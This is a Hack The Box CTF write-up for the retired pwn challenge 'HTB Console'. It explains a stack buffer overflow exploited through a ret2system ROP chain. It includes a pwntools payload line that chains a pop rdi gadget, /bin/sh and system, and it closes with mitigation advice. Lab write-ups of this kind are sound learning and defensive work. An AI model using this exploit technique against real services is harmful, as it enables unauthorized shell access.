---
challenge: HTB Console
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, stack, ret2system, rop, pwntools]
---

# HTB Console — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flag.

## TL;DR

A console vulnerable to a stack overflow allows the return address to be overwritten. The binary contains a function that calls `system`; place `/bin/sh` or the command in the right register and obtain a shell.

## Prompt and surface

- Pwn, Easy, retired.
- An ELF and a remote service are provided.
- The goal is to read the server flag.

```bash
file htb-console
checksec --file=htb-console
```

## Reconnaissance

```bash
python3 -c 'print("A"*200)' | ./htb-console
```

- 64-bit binary without PIE.
- `gets`/`read` copies more than the buffer holds.
- A `system` function or a `win` that runs a command exists.

## Analysis

Calculate the offset with `cyclic` and locate the target function. On 32-bit the argument is on the stack; on 64-bit use a `pop rdi; ret` gadget and the `/bin/sh` address.

```python
from pwn import *
elf = ELF('./htb-console')
rop = ROP(elf)
```

## Exploitation

Build the payload with the offset, gadget, `system` and `/bin/sh`, then send it to the service. Keep the connection interactive to read the flag.

```python
payload = flat(b'A'*offset, rop.find_gadget(['pop rdi','ret'])[0], next(elf.search(b'/bin/sh')), elf.plt['system'])
```

## Evidence

- Crash with a controlled offset.
- Overwritten return address.
- Shell and flag read without publishing it.

## Lessons

- An unbounded buffer allows stack control.
- `ret2system` is the simplest ROP case.
- The offset is found with a cyclic pattern.
- Architecture changes the argument convention.

## Mitigations and detection

- Use bounded `fgets`/`read` and validate input.
- Build with canaries, NX, PIE and RELRO.
- Enable ASLR and do not expose internal functions.
- Monitor crashes and long strings in the service.
- References: OWASP Buffer Overflow, pwntools ROP.

## References

- <https://www.hackthebox.com/challenges/HTB%20Console>
- <https://owasp.org/www-community/vulnerabilities/Buffer_Overflow>
- <https://docs.pwntools.com/en/stable/rop/rop.html>
- <https://attack.mitre.org/techniques/T1203/>
